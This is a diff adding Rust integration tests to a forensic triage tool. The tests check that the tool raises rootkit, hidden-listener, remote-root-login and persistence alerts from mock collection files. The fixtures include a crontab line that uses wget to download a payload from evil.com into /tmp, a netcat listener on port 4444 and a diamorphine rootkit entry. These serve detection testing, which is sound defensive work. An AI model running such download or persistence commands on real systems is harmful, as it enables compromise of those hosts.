@@ -990,4 +990,278 @@ mod tests {
             "expected packages to be loaded, got none"
         );
     }
+
+    // =================================================================
+    // Multi-artifact correlation integration tests
+    // =================================================================
+
+    #[test]
+    fn load_uac_collection_compound_rootkit_with_unattributed_listener() {
+        // Scenario: rootkit module loaded + unattributed LISTEN socket
+        // Expected: compound correlation alert (Critical)
+        let dir = tempfile::tempdir().expect("tmpdir");
+        let root = dir.path();
+
+        // Rootkit indicator: diamorphine kernel module
+        std::fs::create_dir_all(root.join("live_response/system")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/system/lsmod.txt"),
+            "Module                  Size  Used by\n\
+             diamorphine            16384  0\n\
+             ext4                 1142784  1\n",
+        )
+        .expect("write");
+
+        // Unattributed LISTEN socket (no PID — hidden by rootkit)
+        std::fs::create_dir_all(root.join("live_response/network")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/network/ss_-tlnp.txt"),
+            "State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\n\
+             LISTEN 0      128    0.0.0.0:4444         0.0.0.0:*\n",
+        )
+        .expect("write");
+
+        let data = load_uac_collection(root, None);
+
+        // Should produce the compound correlation alert
+        let compound = data.alerts.iter().find(|a| {
+            a.category == "correlation"
+                && a.message.contains("Rootkit")
+                && a.message.contains("hidden network listener")
+        });
+        assert!(
+            compound.is_some(),
+            "expected compound rootkit+unattributed alert, got: {:?}",
+            data.alerts
+                .iter()
+                .map(|a| format!("[{}] {}: {}", a.severity.label(), a.category, a.message))
+                .collect::<Vec<_>>()
+        );
+        let alert = compound.unwrap();
+        assert!(
+            matches!(
+                alert.severity,
+                crate::investigation::alerts::AlertSeverity::Critical
+            ),
+            "compound indicator should be Critical"
+        );
+    }
+
+    #[test]
+    fn load_uac_collection_rootkit_with_suspicious_crontab_persistence() {
+        // Scenario: rootkit indicator + crontab calling wget
+        // Expected: rootkit+persistence correlation Warning
+        let dir = tempfile::tempdir().expect("tmpdir");
+        let root = dir.path();
+
+        // Rootkit: tainted kernel
+        std::fs::create_dir_all(root.join("live_response/system")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/system/cat_proc_sys_kernel_tainted.txt"),
+            "12289\n",
+        )
+        .expect("write");
+
+        // Suspicious crontab with wget
+        std::fs::create_dir_all(root.join("live_response/process")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/process/crontab.txt"),
+            "*/10 * * * * wget -q http://evil.com/payload -O /tmp/update\n",
+        )
+        .expect("write");
+
+        let data = load_uac_collection(root, None);
+
+        let persistence_alert = data.alerts.iter().find(|a| {
+            a.category == "correlation" && a.message.contains("suspicious scheduled task")
+        });
+        assert!(
+            persistence_alert.is_some(),
+            "expected rootkit+crontab persistence alert, got: {:?}",
+            data.alerts
+                .iter()
+                .map(|a| format!("[{}] {}: {}", a.severity.label(), a.category, a.message))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn load_uac_collection_remote_root_login_detected() {
+        // Scenario: remote root login from suspicious IP
+        // Expected: Critical auth alert
+        let dir = tempfile::tempdir().expect("tmpdir");
+        let root = dir.path();
+
+        std::fs::create_dir_all(root.join("live_response/system")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/system/last.txt"),
+            "root     pts/0        10.13.37.100     Mon Mar 24 14:00   still logged in\n\
+             admin    pts/1        192.168.1.50     Mon Mar 24 13:00 - 13:30  (00:30)\n\
+             admin    pts/2        192.168.1.50     Mon Mar 24 12:00 - 12:45  (00:45)\n",
+        )
+        .expect("write");
+
+        let data = load_uac_collection(root, None);
+
+        let root_login_alert = data
+            .alerts
+            .iter()
+            .find(|a| a.category == "auth" && a.message.contains("Remote root login"));
+        assert!(
+            root_login_alert.is_some(),
+            "expected remote root login alert, got: {:?}",
+            data.alerts
+                .iter()
+                .map(|a| format!("[{}] {}: {}", a.severity.label(), a.category, a.message))
+                .collect::<Vec<_>>()
+        );
+        let alert = root_login_alert.unwrap();
+        assert!(
+            alert.detail.contains("10.13.37.100"),
+            "expected source IP in detail, got: {}",
+            alert.detail
+        );
+
+        // 10.13.37.100 appears only once → also flagged as unique source
+        let unique_alert = data.alerts.iter().find(|a| {
+            a.category == "auth"
+                && a.message.contains("Unique login source")
+                && a.message.contains("10.13.37.100")
+        });
+        assert!(
+            unique_alert.is_some(),
+            "expected unique login source alert for 10.13.37.100"
+        );
+    }
+
+    #[test]
+    fn load_uac_collection_process_network_correlation_temp_dir() {
+        // Scenario: process running from /tmp with active connection
+        // Expected: Critical correlation alert
+        let dir = tempfile::tempdir().expect("tmpdir");
+        let root = dir.path();
+
+        // Process running from /tmp
+        std::fs::create_dir_all(root.join("live_response/process")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/process/ps_auxwww.txt"),
+            "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n\
+             root      1337  0.0  0.1  12345  6789 ?        S    14:00   0:00 /tmp/beacon\n\
+             root         1  0.0  0.5  16000  4000 ?        Ss   10:00   0:05 /sbin/init\n",
+        )
+        .expect("write");
+
+        // Network connection from PID 1337
+        std::fs::create_dir_all(root.join("live_response/network")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/network/ss_-tlnp.txt"),
+            "State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\n\
+             ESTAB  0      0      10.0.0.5:45678       198.51.100.1:443   users:((\"beacon\",pid=1337,fd=3))\n",
+        )
+        .expect("write");
+
+        let data = load_uac_collection(root, None);
+
+        let corr_alert = data
+            .alerts
+            .iter()
+            .find(|a| a.category == "correlation" && a.message.contains("Temp-dir process"));
+        assert!(
+            corr_alert.is_some(),
+            "expected temp-dir process + network correlation alert, got: {:?}",
+            data.alerts
+                .iter()
+                .map(|a| format!("[{}] {}: {}", a.severity.label(), a.category, a.message))
+                .collect::<Vec<_>>()
+        );
+        let alert = corr_alert.unwrap();
+        assert!(
+            alert.detail.contains("pid=1337"),
+            "expected PID in detail, got: {}",
+            alert.detail
+        );
+    }
+
+    #[test]
+    fn load_uac_collection_crontab_persistence_with_bodyfile_enrichment() {
+        // Scenario: crontab runs /tmp/updater.sh which exists in bodyfile
+        // Expected: Critical correlation with file metadata enrichment
+        let dir = tempfile::tempdir().expect("tmpdir");
+        let root = dir.path();
+
+        // Crontab
+        std::fs::create_dir_all(root.join("live_response/process")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/process/crontab.txt"),
+            "*/5 * * * * /tmp/updater.sh\n",
+        )
+        .expect("write");
+
+        // Bodyfile with the temp file present
+        std::fs::create_dir_all(root.join("bodyfile")).expect("mkdir");
+        std::fs::write(
+            root.join("bodyfile/bodyfile.txt"),
+            "0|/tmp/updater.sh|500|100755|0|0|4096|1711000000|1711000000|1711000000|0\n",
+        )
+        .expect("write");
+
+        let data = load_uac_collection(root, None);
+
+        let persist_alert = data.alerts.iter().find(|a| {
+            a.category == "correlation"
+                && a.message.contains("Crontab persistence")
+                && a.message.contains("/tmp/updater.sh")
+        });
+        assert!(
+            persist_alert.is_some(),
+            "expected crontab persistence alert, got: {:?}",
+            data.alerts
+                .iter()
+                .map(|a| format!("[{}] {}: {}", a.severity.label(), a.category, a.message))
+                .collect::<Vec<_>>()
+        );
+        let alert = persist_alert.unwrap();
+        assert!(
+            alert.detail.contains("size=4096"),
+            "expected bodyfile enrichment in detail, got: {}",
+            alert.detail
+        );
+    }
+
+    #[test]
+    fn load_uac_collection_suspicious_listener_includes_sigma_source() {
+        // Verify SIGMA source attribution flows through the pipeline
+        let dir = tempfile::tempdir().expect("tmpdir");
+        let root = dir.path();
+
+        std::fs::create_dir_all(root.join("live_response/network")).expect("mkdir");
+        std::fs::write(
+            root.join("live_response/network/ss_-tlnp.txt"),
+            "State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\n\
+             LISTEN 0      128    0.0.0.0:4444         0.0.0.0:*         users:((\"nc\",pid=666,fd=4))\n",
+        )
+        .expect("write");
+
+        let data = load_uac_collection(root, None);
+
+        let susp_alert = data
+            .alerts
+            .iter()
+            .find(|a| a.category == "network" && a.message.contains("4444"));
+        assert!(
+            susp_alert.is_some(),
+            "expected suspicious listener alert for port 4444"
+        );
+        let alert = susp_alert.unwrap();
+        assert!(
+            alert.detail.contains("source: SIGMA"),
+            "expected SIGMA source in detail, got: {}",
+            alert.detail
+        );
+        assert!(
+            alert.message.contains("Metasploit"),
+            "expected Metasploit description in message, got: {}",
+            alert.message
+        );
+    }
 }
